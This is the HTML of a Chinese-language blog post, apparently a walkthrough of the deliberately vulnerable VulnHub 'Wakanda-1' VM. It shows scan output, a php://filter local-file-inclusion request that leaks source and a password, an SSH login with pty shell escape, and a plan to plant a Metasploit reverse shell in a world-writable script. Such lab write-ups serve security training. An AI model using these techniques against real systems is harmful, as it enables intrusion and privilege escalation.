@@ -1,0 +1,406 @@
+<!doctype html>
+<html lang="zh-CN">
+<head><meta name="generator" content="Hexo 3.8.0">
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=11,IE=10,IE=9,IE=8">
+    <meta name="baidu-site-verification" content="dIcXMeY8Ya">
+    
+    <title>Write-Up-wakanda-1 | Kali-Team</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=0">
+    <meta name="keywords" content="Kali-Team, 三米前有蕉皮">
+    <meta name="description" content="Kali-Team">
+
+    
+    <link rel="alternative" href="/atom.xml" title="Kali-Team" type="application/atom+xml">
+    
+    
+    <link rel="shortcut icon" href="/favicon.ico">
+    
+    <link rel="stylesheet" href="/css/style.css">
+    <!--[if lt IE 9]>
+    <script src="/js/html5.js"></script>
+    <![endif]-->
+    
+
+</head>
+</html>
+<body class="home">
+    <!--[if lt IE 9]>
+    <div class="browsehappy">
+        当前网页 <strong>不支持</strong>
+        你正在使用的浏览器. 为了正常的访问, 请 <a href="http://browsehappy.com/">升级你的浏览器</a>.
+    </div>
+    <![endif]-->
+
+    <!-- 博客头部 -->
+    <header class="header">
+    <section class="container header-main">
+        <div class="logo">
+            <a href="/">
+                <div class="cover">
+                    <span class="name">Kali-Team</span>
+                    <span class="description">三米前有蕉皮</span>
+                </div>
+            </a>
+        </div>
+        <div class="dropnav icon-paragraph-justify" id="JELON__btnDropNav"></div>
+        <ul class="menu hidden" id="JELON__menu">
+            
+            <li rel="/2018/10/16/Write-up-wakanda-1/index.html" class="item ">
+                <a href="/" title="首页" class="icon-home">&nbsp;首页</a>
+            </li>
+            
+            <li rel="/2018/10/16/Write-up-wakanda-1/index.html" class="item ">
+                <a href="/lab/" title="实验室" class="icon-lab">&nbsp;实验室</a>
+            </li>
+            
+            <li rel="/2018/10/16/Write-up-wakanda-1/index.html" class="item ">
+                <a href="/about/" title="关于" class="icon-about">&nbsp;关于</a>
+            </li>
+            
+            <li rel="/2018/10/16/Write-up-wakanda-1/index.html" class="item ">
+                <a href="/comment/" title="留言" class="icon-comment">&nbsp;留言</a>
+            </li>
+            
+        </ul>
+        <div class="profile clearfix">
+            <div class="feeds fl">
+                
+                
+                <p class="links">
+                    
+                        <a href="https://github.com/cn-kali-team" target="_blank">Github</a>
+                        |
+                    
+                </p>
+                <p class="sns">
+                    
+                    <a href="javascript: void(0);" class="wechat">
+                        <b>■</b>
+                        公众号
+                        <span class="popover">
+                            <img src="/img/wechat_mp.jpg" width="120" height="120" alt="我的微信订阅号">
+                            <i class="arrow"></i>
+                        </span>
+                    </a>
+                </p>
+                
+            </div>
+            <div class="avatar fr">
+                <img src="/img/favicon.ico" alt="avatar" title="Kali-Team">
+            </div>
+        </div>
+    </section>
+</header>
+
+
+    <!-- 博客正文 -->
+    <div class="container body clearfix">
+        <section class="content">
+            <div class="content-main widget">
+                <!-- 文章页 -->
+<!-- 文章 -->
+<article class="post article">
+    <header class="text-center">
+        <h3 class="post-title"><span>Write-Up-wakanda-1</span></h3>
+    </header>
+    <p class="post-meta text-center">
+        Kali-Team 发表于
+        <time datetime="2018-10-16T11:56:42.000Z">2018-10-16</time>
+    </p>
+    <div class="post-content">
+        <h2 id="关于"><a href="#关于" class="headerlink" title="关于"></a>关于</h2><ul>
+<li><p>下载地址：<a href="https://www.vulnhub.com/entry/wakanda-1,251/#download" target="_blank" rel="noopener">点我</a></p>
+</li>
+<li><p>哔哩哔哩：<a href="https://www.bilibili.com/video/av34064129" target="_blank" rel="noopener">哔哩哔哩</a></p>
+</li>
+</ul>
+<h2 id="祖传开头"><a href="#祖传开头" class="headerlink" title="祖传开头"></a>祖传开头</h2><h3 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h3><ul>
+<li>这里用vm虚拟机可能有一点问题，因为官方的是用vbox虚拟机导出的镜像文件。所以这次使用vbox虚拟机。</li>
+</ul>
+<a id="more"></a>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">➜  ~ ip a show dev vboxnet0 </span><br><span class="line">6: vboxnet0: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc fq_codel state UP group default qlen 1000</span><br><span class="line">    link/ether 0a:00:27:00:00:00 brd ff:ff:ff:ff:ff:ff</span><br><span class="line">    inet 192.168.56.1/24 brd 192.168.56.255 scope global vboxnet0</span><br><span class="line">       valid_lft forever preferred_lft forever</span><br><span class="line">    inet6 fe80::800:27ff:fe00:0/64 scope link </span><br><span class="line">       valid_lft forever preferred_lft forever</span><br><span class="line">➜  ~ nmap -sn 192.168.56.1/24</span><br><span class="line">Starting Nmap 7.70 ( https://nmap.org ) at 2018-10-16 20:00 CST</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 192.168.56.1</span><br><span class="line">Host is up (0.0011s latency).</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 192.168.56.101</span><br><span class="line">Host is up (0.00057s latency).</span><br><span class="line">Nmap <span class="keyword">done</span>: 256 IP addresses (2 hosts up) scanned <span class="keyword">in</span> 2.77 seconds</span><br></pre></td></tr></table></figure>
+<ul>
+<li>IP是192.168.56.101，除了开放了RPC服务和以前的没什么太大的变化。从Web入手。</li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">➜  ~ nmap -T4 -A 192.168.56.101</span><br><span class="line">Starting Nmap 7.70 ( https://nmap.org ) at 2018-10-16 20:01 CST</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 192.168.56.101</span><br><span class="line">Host is up (0.0023s latency).</span><br><span class="line">Not shown: 997 closed ports</span><br><span class="line">PORT     STATE SERVICE VERSION</span><br><span class="line">80/tcp   open  http    Apache httpd 2.4.10 ((Debian))</span><br><span class="line">|_http-server-header: Apache/2.4.10 (Debian)</span><br><span class="line">|_http-title: Vibranium Market</span><br><span class="line">111/tcp  open  rpcbind 2-4 (RPC <span class="comment">#100000)</span></span><br><span class="line">| rpcinfo: </span><br><span class="line">|   program version   port/proto  service</span><br><span class="line">|   100000  2,3,4        111/tcp  rpcbind</span><br><span class="line">|   100000  2,3,4        111/udp  rpcbind</span><br><span class="line">|   100024  1          40326/tcp  status</span><br><span class="line">|_  100024  1          54014/udp  status</span><br><span class="line">3333/tcp open  ssh     OpenSSH 6.7p1 Debian 5+deb8u4 (protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   1024 1c:98:47:56:<span class="built_in">fc</span>:b8:14:08:8f:93:ca:36:44:7f:ea:7a (DSA)</span><br><span class="line">|   2048 f1:d5:04:78:d3:3a:9b:dc:13:df:0f:5f:7f:fb:f4:26 (RSA)</span><br><span class="line">|   256 d8:34:41:5d:9b:fe:51:bc:c6:4e:02:14:5e:e1:08:c5 (ECDSA)</span><br><span class="line">|_  256 0e:f5:8d:29:3c:73:57:c7:38:08:6d:50:84:b6:6c:27 (ED25519)</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap <span class="keyword">done</span>: 1 IP address (1 host up) scanned <span class="keyword">in</span> 7.34 seconds</span><br></pre></td></tr></table></figure>
+<ul>
+<li>主页是一个单页，扫一顿也没发现什么。但是F12发现了<code>&lt;!-- &lt;a class=&quot;nav-link active&quot; href=&quot;?lang=fr&quot;&gt;Fr/a&gt; --&gt;</code>，访问<code>http://192.168.56.101/?lang=fr</code>时主页多了一写东西。猜想这是切换语言是要包含本地文件，所以就试了试。发现存在LFI漏洞。和以前的<a href="https://kali-team.cn/2018/07/10/Write-up-pwnlab-init/">pwnlab_init</a>套路一样。</li>
+</ul>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line">➜  ~ nikto -h http://192.168.56.101</span><br><span class="line">- Nikto v2.1.6</span><br><span class="line"><span class="comment">---------------------------------------------------------------------------</span></span><br><span class="line">+ Target IP:          192.168.56.101</span><br><span class="line">+ Target Hostname:    192.168.56.101</span><br><span class="line">+ Target Port:        80</span><br><span class="line">+ <span class="keyword">Start</span> <span class="built_in">Time</span>:         <span class="number">2018</span><span class="number">-10</span><span class="number">-16</span> <span class="number">20</span>:<span class="number">06</span>:<span class="number">38</span> (GMT8)</span><br><span class="line"><span class="comment">---------------------------------------------------------------------------</span></span><br><span class="line">+ <span class="keyword">Server</span>: Apache/<span class="number">2.4</span><span class="number">.10</span> (Debian)</span><br><span class="line">+ The <span class="keyword">anti</span>-clickjacking X-Frame-Options header <span class="keyword">is</span> <span class="keyword">not</span> present.</span><br><span class="line">+ The X-XSS-<span class="keyword">Protection</span> header <span class="keyword">is</span> <span class="keyword">not</span> defined. This header can hint <span class="keyword">to</span> the <span class="keyword">user</span> <span class="keyword">agent</span> <span class="keyword">to</span> protect against <span class="keyword">some</span> forms <span class="keyword">of</span> XSS</span><br><span class="line">+ The X-<span class="keyword">Content</span>-<span class="keyword">Type</span>-Options header <span class="keyword">is</span> <span class="keyword">not</span> set. This could <span class="keyword">allow</span> the <span class="keyword">user</span> <span class="keyword">agent</span> <span class="keyword">to</span> render the <span class="keyword">content</span> <span class="keyword">of</span> the site <span class="keyword">in</span> a different fashion <span class="keyword">to</span> the MIME <span class="keyword">type</span></span><br><span class="line">+ <span class="keyword">No</span> CGI Directories <span class="keyword">found</span> (<span class="keyword">use</span> <span class="string">'-C all'</span> <span class="keyword">to</span> <span class="keyword">force</span> <span class="keyword">check</span> <span class="keyword">all</span> possible dirs)</span><br><span class="line">+ Apache/<span class="number">2.4</span><span class="number">.10</span> appears <span class="keyword">to</span> be outdated (<span class="keyword">current</span> <span class="keyword">is</span> <span class="keyword">at</span> <span class="keyword">least</span> Apache/<span class="number">2.4</span><span class="number">.12</span>). Apache <span class="number">2.0</span><span class="number">.65</span> (<span class="keyword">final</span> <span class="keyword">release</span>) <span class="keyword">and</span> <span class="number">2.2</span><span class="number">.29</span> <span class="keyword">are</span> also current.</span><br><span class="line">+ Web <span class="keyword">Server</span> <span class="keyword">returns</span> a valid response <span class="keyword">with</span> junk <span class="keyword">HTTP</span> methods, this may cause <span class="literal">false</span> positives.</span><br><span class="line">+ <span class="keyword">Server</span> leaks inodes via ETags, header <span class="keyword">found</span> <span class="keyword">with</span> <span class="keyword">file</span> /icons/README, <span class="keyword">fields</span>: <span class="number">0x13f4</span> <span class="number">0x438c034968a80</span> </span><br><span class="line">+ OSVDB<span class="number">-3233</span>: /icons/README: Apache <span class="keyword">default</span> <span class="keyword">file</span> found.</span><br><span class="line">+ <span class="number">7535</span> requests: <span class="number">0</span> <span class="keyword">error</span>(s) <span class="keyword">and</span> <span class="number">7</span> item(s) reported <span class="keyword">on</span> remote host</span><br><span class="line">+ <span class="keyword">End</span> <span class="built_in">Time</span>:           <span class="number">2018</span><span class="number">-10</span><span class="number">-16</span> <span class="number">20</span>:<span class="number">06</span>:<span class="number">57</span> (GMT8) (<span class="number">19</span> <span class="keyword">seconds</span>)</span><br><span class="line"><span class="comment">---------------------------------------------------------------------------</span></span><br><span class="line">+ <span class="number">1</span> host(s) tested</span><br><span class="line">➜  ~ dirb <span class="keyword">http</span>://<span class="number">192.168</span><span class="number">.56</span><span class="number">.101</span>/</span><br><span class="line"></span><br><span class="line"><span class="comment">-----------------</span></span><br><span class="line">DIRB v2<span class="number">.22</span>    </span><br><span class="line"><span class="keyword">By</span> The Dark Raver</span><br><span class="line"><span class="comment">-----------------</span></span><br><span class="line"></span><br><span class="line">START_TIME: Tue <span class="keyword">Oct</span> <span class="number">16</span> <span class="number">20</span>:<span class="number">07</span>:<span class="number">03</span> <span class="number">2018</span></span><br><span class="line">URL_BASE: <span class="keyword">http</span>://<span class="number">192.168</span><span class="number">.56</span><span class="number">.101</span>/</span><br><span class="line">WORDLIST_FILES: /usr/<span class="keyword">share</span>/dirb/wordlists/common.txt</span><br><span class="line"></span><br><span class="line"><span class="comment">-----------------</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">GENERATED</span> WORDS: <span class="number">4612</span>                                                          </span><br><span class="line"></span><br><span class="line"><span class="comment">---- Scanning URL: http://192.168.56.101/ ----</span></span><br><span class="line">+ <span class="keyword">http</span>://<span class="number">192.168</span><span class="number">.56</span><span class="number">.101</span>/<span class="keyword">admin</span> (CODE:<span class="number">200</span>|<span class="keyword">SIZE</span>:<span class="number">0</span>)                                       </span><br><span class="line">+ <span class="keyword">http</span>://<span class="number">192.168</span><span class="number">.56</span><span class="number">.101</span>/<span class="keyword">backup</span> (CODE:<span class="number">200</span>|<span class="keyword">SIZE</span>:<span class="number">0</span>)                                     </span><br><span class="line">+ <span class="keyword">http</span>://<span class="number">192.168</span><span class="number">.56</span><span class="number">.101</span>/index.php (CODE:<span class="number">200</span>|<span class="keyword">SIZE</span>:<span class="number">1527</span>)                               </span><br><span class="line">+ <span class="keyword">http</span>://<span class="number">192.168</span><span class="number">.56</span><span class="number">.101</span>/secret (CODE:<span class="number">200</span>|<span class="keyword">SIZE</span>:<span class="number">0</span>)                                     </span><br><span class="line">+ <span class="keyword">http</span>://<span class="number">192.168</span><span class="number">.56</span><span class="number">.101</span>/<span class="keyword">server</span>-<span class="keyword">status</span> (CODE:<span class="number">403</span>|<span class="keyword">SIZE</span>:<span class="number">302</span>)                             </span><br><span class="line">+ <span class="keyword">http</span>://<span class="number">192.168</span><span class="number">.56</span><span class="number">.101</span>/shell (CODE:<span class="number">200</span>|<span class="keyword">SIZE</span>:<span class="number">0</span>)                                       </span><br><span class="line"><span class="comment">-----------------</span></span><br><span class="line">END_TIME: Tue <span class="keyword">Oct</span> <span class="number">16</span> <span class="number">20</span>:<span class="number">07</span>:<span class="number">05</span> <span class="number">2018</span></span><br><span class="line">DOWNLOADED: <span class="number">4612</span> - <span class="keyword">FOUND</span>: <span class="number">6</span></span><br><span class="line">➜  ~</span><br></pre></td></tr></table></figure>
+<h3 id="利用LFI漏洞"><a href="#利用LFI漏洞" class="headerlink" title="利用LFI漏洞"></a>利用LFI漏洞</h3><ul>
+<li>利用<code>php://filter/convert.base64-encode/resource</code>获取inde页面的源码再base64解码。</li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">➜ ～ curl <span class="string">"http://192.168.56.101/?lang=php://filter/convert.base64-encode/resource=index"</span></span><br><span class="line">PD9waHAKJHBhc3N3b3JkID0iTmlhbWV5NEV2ZXIyMjchISEiIDsvL0kgaGF2ZSB0byByZW1lbWJlciBpdAoKaWYgKGlzc2V0KCRfR0VUWydsYW5nJ10pKQp7CmluY2x1ZGUoJF9HRVRbJ2xhbmcnXS4iLnBocCIpOwp9Cgo/PgoKCgo8IURPQ1RZUEUgaHRtbD4KPGh0bWwgbGFuZz0iZW4iPjxoZWFkPgo8bWV0YSBodHRwLWVxdWl2PSJjb250ZW50LXR5cGUiIGNvbnRlbnQ9InRleHQvaHRtbDsgY2hhcnNldD1VVEYtOCI+CiAgICA8bWV0YSBjaGFyc2V0PSJ1dGYtOCI+CiAgICA8bWV0YSBuYW1lPSJ2aWV3cG9ydCIgY29udGVudD0id2lkdGg9ZGV2aWNlLXdpZHRoLCBpbml0aWFsLXNjYWxlPTEsIHNocmluay10by1maXQ9bm8iPgogICAgPG1ldGEgbmFtZT0iZGVzY3JpcHRpb24iIGNvbnRlbnQ9IlZpYnJhbml1bSBtYXJrZXQiPgogICAgPG1ldGEgbmFtZT0iYXV0aG9yIiBjb250ZW50PSJtYW1hZG91Ij4KCiAgICA8dGl0bGU+VmlicmFuaXVtIE1hcmtldDwvdGl0bGU+CgoKICAgIDxsaW5rIGhyZWY9ImJvb3RzdHJhcC5jc3MiIHJlbD0ic3R5bGVzaGVldCI+CgogICAgCiAgICA8bGluayBocmVmPSJjb3Zlci5jc3MiIHJlbD0ic3R5bGVzaGVldCI+CiAgPC9oZWFkPgoKICA8Ym9keSBjbGFzcz0idGV4dC1jZW50ZXIiPgoKICAgIDxkaXYgY2xhc3M9ImNvdmVyLWNvbnRhaW5lciBkLWZsZXggdy0xMDAgaC0xMDAgcC0zIG14LWF1dG8gZmxleC1jb2x1bW4iPgogICAgICA8aGVhZGVyIGNsYXNzPSJtYXN0aGVhZCBtYi1hdXRvIj4KICAgICAgICA8ZGl2IGNsYXNzPSJpbm5lciI+CiAgICAgICAgICA8aDMgY2xhc3M9Im1hc3RoZWFkLWJyYW5kIj5WaWJyYW5pdW0gTWFya2V0PC9oMz4KICAgICAgICAgIDxuYXYgY2xhc3M9Im5hdiBuYXYtbWFzdGhlYWQganVzdGlmeS1jb250ZW50LWNlbnRlciI+CiAgICAgICAgICAgIDxhIGNsYXNzPSJuYXYtbGluayBhY3RpdmUiIGhyZWY9IiMiPkhvbWU8L2E+CiAgICAgICAgICAgIDwhLS0gPGEgY2xhc3M9Im5hdi1saW5rIGFjdGl2ZSIgaHJlZj0iP2xhbmc9ZnIiPkZyL2E+IC0tPgogICAgICAgICAgPC9uYXY+CiAgICAgICAgPC9kaXY+CiAgICAgIDwvaGVhZGVyPgoKICAgICAgPG1haW4gcm9sZT0ibWFpbiIgY2xhc3M9ImlubmVyIGNvdmVyIj4KICAgICAgICA8aDEgY2xhc3M9ImNvdmVyLWhlYWRpbmciPkNvbWluZyBzb29uPC9oMT4KICAgICAgICA8cCBjbGFzcz0ibGVhZCI+CiAgICAgICAgICA8P3BocAogICAgICAgICAgICBpZiAoaXNzZXQoJF9HRVRbJ2xhbmcnXSkpCiAgICAgICAgICB7CiAgICAgICAgICBlY2hvICRtZXNzYWdlOwogICAgICAgICAgfQogICAgICAgICAgZWxzZQogICAgICAgICAgewogICAgICAgICAgICA/PgoKICAgICAgICAgICAgTmV4dCBvcGVuaW5nIG9mIHRoZSBsYXJnZXN0IHZpYnJhbml1bSBtYXJrZXQuIFRoZSBwcm9kdWN0cyBjb21lIGRpcmVjdGx5IGZyb20gdGhlIHdha2FuZGEuIHN0YXkgdHVuZWQhCiAgICAgICAgICAgIDw/cGhwCiAgICAgICAgICB9Cj8+CiAgICAgICAgPC9wPgogICAgICAgIDxwIGNsYXNzPSJsZWFkIj4KICAgICAgICAgIDxhIGhyZWY9IiMiIGNsYXNzPSJidG4gYnRuLWxnIGJ0bi1zZWNvbmRhcnkiPkxlYXJuIG1vcmU8L2E+CiAgICAgICAgPC9wPgogICAgICA8L21haW4+CgogICAgICA8Zm9vdGVyIGNsYXNzPSJtYXN0Zm9vdCBtdC1hdXRvIj4KICAgICAgICA8ZGl2IGNsYXNzPSJpbm5lciI+CiAgICAgICAgICA8cD5NYWRlIGJ5PGEgaHJlZj0iIyI+QG1hbWFkb3U8L2E+PC9wPgogICAgICAgIDwvZGl2PgogICAgICA8L2Zvb3Rlcj4KICAgIDwvZGl2PgoKCgogIAoKPC9ib2R5PjwvaHRtbD4=</span><br></pre></td></tr></table></figure>
+<h3 id="登录SSH"><a href="#登录SSH" class="headerlink" title="登录SSH"></a>登录SSH</h3><ul>
+<li>在源码里找到了<code>$password =&quot;Niamey4Ever227!!!&quot; ;//I have to remember it</code>，密码找到了，有在主页里找到了<code>Made by[@mamadou](http://192.168.56.101/#)</code>所以用户名是mamadou。登录ssh。</li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">➜  ~ ssh mamadou@192.168.56.101 -p 3333</span><br><span class="line">The authenticity of host <span class="string">'[192.168.56.101]:3333 ([192.168.56.101]:3333)'</span> can<span class="string">'t be established.</span></span><br><span class="line"><span class="string">ECDSA key fingerprint is SHA256:X+fXjgH34Ta5l6I4kUSpiVZNBGGBGtjxZxgyU7KCFwk.</span></span><br><span class="line"><span class="string">Are you sure you want to continue connecting (yes/no)? yes</span></span><br><span class="line"><span class="string">Warning: Permanently added '</span>[192.168.56.101]:3333<span class="string">' (ECDSA) to the list of known hosts.</span></span><br><span class="line"><span class="string">mamadou@192.168.56.101'</span>s password: </span><br><span class="line"></span><br><span class="line">The programs included with the Debian GNU/Linux system are free software;</span><br><span class="line">the exact distribution terms <span class="keyword">for</span> each program are described <span class="keyword">in</span> the</span><br><span class="line">individual files <span class="keyword">in</span> /usr/share/doc/*/copyright.</span><br><span class="line"></span><br><span class="line">Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent</span><br><span class="line">permitted by applicable law.</span><br><span class="line">Last login: Fri Aug  3 15:53:29 2018 from 192.168.56.1</span><br><span class="line">Python 2.7.9 (default, Jun 29 2016, 13:08:31) </span><br><span class="line">[GCC 4.9.2] on linux2</span><br><span class="line">Type <span class="string">"help"</span>, <span class="string">"copyright"</span>, <span class="string">"credits"</span> or <span class="string">"license"</span> <span class="keyword">for</span> more information.</span><br><span class="line">&gt;&gt;&gt;</span><br></pre></td></tr></table></figure>
+<ul>
+<li>但是发现这并不是系统的bash shell而是一个Python的交互命令行。这好办，都不用我输入<code>python -c &#39;import pty;pty.spawn(&quot;/bin/bash&quot;)&#39;</code>，第一个Flag到手。</li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">Python 2.7.9 (default, Jun 29 2016, 13:08:31) </span><br><span class="line">[GCC 4.9.2] on linux2</span><br><span class="line">Type <span class="string">"help"</span>, <span class="string">"copyright"</span>, <span class="string">"credits"</span> or <span class="string">"license"</span> <span class="keyword">for</span> more information.</span><br><span class="line">&gt;&gt;&gt; import pty</span><br><span class="line">&gt;&gt;&gt; pty.spawn(<span class="string">"/bin/bash"</span>)</span><br><span class="line">mamadou@Wakanda1:~$ id</span><br><span class="line">uid=1000(mamadou) gid=1000(mamadou) groups=1000(mamadou)</span><br><span class="line">mamadou@Wakanda1:~$ </span><br><span class="line">mamadou@Wakanda1:~$ ls</span><br><span class="line">flag1.txt</span><br><span class="line">mamadou@Wakanda1:~$ cat flag1.txt </span><br><span class="line"></span><br><span class="line">Flag : d86b9ad71ca887f4dd1dac86ba1c4dfc</span><br><span class="line">mamadou@Wakanda1:~$</span><br></pre></td></tr></table></figure>
+<ul>
+<li>在tmp目录发现一个devops用户的一个test文件。</li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">mamadou@Wakanda1:/tmp$ ls -al</span><br><span class="line">total 32</span><br><span class="line">drwxrwxrwt  7 root   root      4096 Oct 16 08:28 .</span><br><span class="line">drwxr-xr-x 22 root   root      4096 Aug  1 13:05 ..</span><br><span class="line">drwxrwxrwt  2 root   root      4096 Oct 16 07:49 .font-unix</span><br><span class="line">drwxrwxrwt  2 root   root      4096 Oct 16 07:49 .ICE-unix</span><br><span class="line">-rw-r--r--  1 devops developer    4 Oct 16 08:24 <span class="built_in">test</span></span><br><span class="line">drwxrwxrwt  2 root   root      4096 Oct 16 07:49 .Test-unix</span><br><span class="line">drwxrwxrwt  2 root   root      4096 Oct 16 07:49 .X11-unix</span><br><span class="line">drwxrwxrwt  2 root   root      4096 Oct 16 07:49 .XIM-unix</span><br><span class="line">mamadou@Wakanda1:/tmp$</span><br></pre></td></tr></table></figure>
+<ul>
+<li>搜索所以属于devops的文件，发现了一个<code>.antivirus.py</code>文件，然后我又回去看了一下test文件，发现更新时间一直再变，那就有可能是上面的py是会隔一段时间就会执行的。</li>
+</ul>
+<figure class="highlight tap"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">mamadou@Wakanda1:/tmp$ find / -user devops 2&gt;/dev/null</span><br><span class="line">/srv/.antivirus.py</span><br><span class="line">/tmp/test</span><br><span class="line">/home/devops</span><br><span class="line">/home/devops/.bashrc</span><br><span class="line">/home/devops/.profile</span><br><span class="line">/home/devops/.bash_logout</span><br><span class="line">/home/devops/flag2.txt</span><br><span class="line">mamadou@Wakanda1:/tmp$ </span><br><span class="line"></span><br><span class="line">mamadou@Wakanda1:/srv$ cat .antivirus.py </span><br><span class="line">open('/tmp/test','w').write('test')</span><br><span class="line">mamadou@Wakanda1:/srv$ ls -la</span><br><span class="line">total 12</span><br><span class="line">drwxr-xr-x <span class="number"> 2 </span>root   root     <span class="number"> 4096 </span>Aug <span class="number"> 1 </span>17:52 .</span><br><span class="line">drwxr-xr-x<span class="number"> 22 </span>root   root     <span class="number"> 4096 </span>Aug <span class="number"> 1 </span>13:05 ..</span><br><span class="line">-rw-r--rw- <span class="number"> 1 </span>devops developer  <span class="number"> 36 </span>Aug <span class="number"> 1 </span>20:08 .antivirus.py</span><br><span class="line">mamadou@Wakanda1:/srv$ </span><br><span class="line">mamadou@Wakanda1:/tmp$ ls -al</span><br><span class="line">total 32</span><br><span class="line">drwxrwxrwt <span class="number"> 7 </span>root   root     <span class="number"> 4096 </span>Oct<span class="number"> 16 </span>08:39 .</span><br><span class="line">drwxr-xr-x<span class="number"> 22 </span>root   root     <span class="number"> 4096 </span>Aug <span class="number"> 1 </span>13:05 ..</span><br><span class="line">drwxrwxrwt <span class="number"> 2 </span>root   root     <span class="number"> 4096 </span>Oct<span class="number"> 16 </span>07:49 .font-unix</span><br><span class="line">drwxrwxrwt <span class="number"> 2 </span>root   root     <span class="number"> 4096 </span>Oct<span class="number"> 16 </span>07:49 .ICE-unix</span><br><span class="line">-rw-r--r-- <span class="number"> 1 </span>devops developer   <span class="number"> 4 </span>Oct<span class="number"> 16 </span>08:39 test</span><br><span class="line">drwxrwxrwt <span class="number"> 2 </span>root   root     <span class="number"> 4096 </span>Oct<span class="number"> 16 </span>07:49 .Test-unix</span><br><span class="line">drwxrwxrwt <span class="number"> 2 </span>root   root     <span class="number"> 4096 </span>Oct<span class="number"> 16 </span>07:49 .X11-unix</span><br><span class="line">drwxrwxrwt <span class="number"> 2 </span>root   root     <span class="number"> 4096 </span>Oct<span class="number"> 16 </span>07:49 .XIM-unix</span><br></pre></td></tr></table></figure>
+<ul>
+<li>生成msf的Python反弹后门，把代码复制到<code>.antivirus.py</code>里打开msf监听7777端口坐等shell。</li>
+</ul>
